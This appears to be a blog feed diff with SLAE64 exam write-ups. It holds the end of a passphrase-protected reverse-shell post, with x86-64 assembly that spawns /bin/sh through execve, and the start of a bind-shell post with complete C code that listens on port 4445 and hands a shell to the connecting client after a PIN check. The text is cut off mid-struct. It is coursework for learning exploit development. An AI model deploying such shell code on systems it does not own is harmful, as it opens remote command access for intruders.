+&lt;h4 id=&quot;part-3---execute-shell-via-execve&quot;&gt;&lt;b&gt;Part 3&lt;/b&gt; - execute shell via execve()&lt;/h4&gt;
+
+&lt;p&gt;Let’s assume that the user has entered the correct PIN code and we have reached to the point where we need to execute the shell. &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; takes 3 arguments: the file we want to execute which for us is the &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, as we it is a pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;const char *filename&lt;/code&gt; we need RDI to contain the address on which we have stored the program name. This is the reason why we first move the string in hex to RBX, push on the top of the stack and then move the address to RDI.&lt;/p&gt;
+
+&lt;p&gt;Next we need to get the address of an array of string constants &lt;code class=&quot;highlighter-rouge&quot;&gt;{&quot;/bin/sh&quot;, NULL};&lt;/code&gt; to RSI. For that we can just push the address we have at RDI to the top of the stack and move that stack address to RSI.&lt;/p&gt;
+
+&lt;p&gt;Third, we do not want to pass any environment variables, so we can make the 3rd argument just 0. So to finish it up, let’s check the &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt; syscall number via &lt;code class=&quot;highlighter-rouge&quot;&gt;ausyscall execve&lt;/code&gt;, read it to RAX and have a go on the last syscall for this task.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f6e69622f&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rbx&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rdi&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;syscall&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There you have it! &amp;lt;3&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Full assembly code can be found at:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.nasm&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Full C code:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task2/reverseshell.c&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post covers the 2/7 task of the SLAE certificate exam which requires a 64-bit reverse shellcode. To establish a connection user is asked to submit the correct passphrase. Student ID: SLAE64 - 1594</summary></entry><entry><title type="html">64-bit bindshell with a passphrase protection</title><link href="http://localhost:4000/blog/2019-01-15-blog-SLAE1/" rel="alternate" type="text/html" title="64-bit bindshell with a passphrase protection" /><published>2019-01-15T00:00:00+02:00</published><updated>2019-01-15T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE1</id><content type="html" xml:base="http://localhost:4000/blog/2019-01-15-blog-SLAE1/">&lt;p&gt;This blog post covers the 1/7 task of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SLAE certificate exam&lt;/a&gt; of creating a 64-bit bindshell which has a check if the correct passphrase is entered upon establishing the connection.&lt;br /&gt;
+&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;
+
+&lt;p&gt;&lt;b&gt;Task - &lt;/b&gt; Create a bind TCP shellcode which:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;binds to a port&lt;/li&gt;
+  &lt;li&gt;needs a “passcode”&lt;/li&gt;
+  &lt;li&gt;if passcode is entered correctly then executes shell&lt;/li&gt;
+  &lt;li&gt;remove all 0x00 bytes from the bind TCP shellcode&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;how-does-bind-shellcode-look-like-in-c&quot;&gt;How does bind shellcode look like in C?&lt;/h2&gt;
+
+&lt;p&gt;Before we start writing any assembly I like to see and understand what we are going to be working on in C language. The most important parts for us are the syscalls - &lt;code class=&quot;highlighter-rouge&quot;&gt;socket(), bind(), accept(), listen(), accept(), dup2(), write(), read() and execve()&lt;/code&gt;, understanding on file descriptors and the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct sockaddr_in&lt;/code&gt; structure.&lt;/p&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;netinet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;netinet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unistd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+
+&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// to hold the value user entered as PIN&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4445&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+	&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;//length of a structure in bytes&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;c1&quot;&gt;//execve 2nd and 3rd argument&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+
+	&lt;span class=&quot;c1&quot;&gt;//create a new socket&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;//bind a name to a socket&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;bind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;//listen for connections on a socket&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;listen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;//accept a connection on a socket&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;accept&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockaddr_len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;//close old fd&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;//duplicate fd-s for newsockfd&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;//write&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Enter PIN:&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newsockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;struct-sockaddr_in-in_addr--sockaddr&quot;&gt;&lt;u&gt;struct sockaddr_in, in_addr &amp;amp; sockaddr&lt;/u&gt;&lt;/h3&gt;
+
+&lt;p&gt;AF_INET family is the address family for IPv4 which uses the &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in&lt;/code&gt; address structure. The structure itself is defined within the &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/include/netinet/in.h&lt;/code&gt; header file along with &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;in_addr&lt;/code&gt; structures. &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in&lt;/code&gt; is simply the IPv4 version of the sockaddr structure.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;sockaddr_in&lt;/code&gt; structure contains:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;sin_family - which is the address family AF_INET&lt;/li&gt;
+  &lt;li&gt;sin_port - port number&lt;/li&gt;
+  &lt;li&gt;sin_addr - member of the &lt;code class=&quot;highlighter-rouge&quot;&gt;in_addr&lt;/code&gt; structure, which contains the IP address&lt;/li&gt;
+  &lt;li&gt;sin_zero[8] - 8 zero bytes for padding, which are reserved for the future cases&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nx&quot;&gt;u_short&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;sa_family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt;	&lt;span class=&quot;nx&quot;&gt;sa_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in_addr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+  &lt;span class=&quot;nx&quot;&gt;in_addr_t&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;cm&quot;&gt;/* the IP address in network byte order    */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
